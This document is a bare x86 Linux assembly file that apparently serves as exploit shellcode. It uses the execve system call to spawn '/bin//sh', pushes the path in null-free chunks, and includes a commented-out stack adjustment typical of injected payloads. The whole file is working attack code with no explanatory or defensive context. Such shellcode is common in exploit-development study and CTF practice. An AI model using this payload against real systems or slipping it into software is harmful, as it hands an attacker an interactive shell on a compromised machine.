global _start

section .text
_start:

	; sub esp, 0x200
	
	; execve("/bin//sh", 0, 0)
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov ecx, eax
	mov edx, eax
	mov al, 11
	int 0x80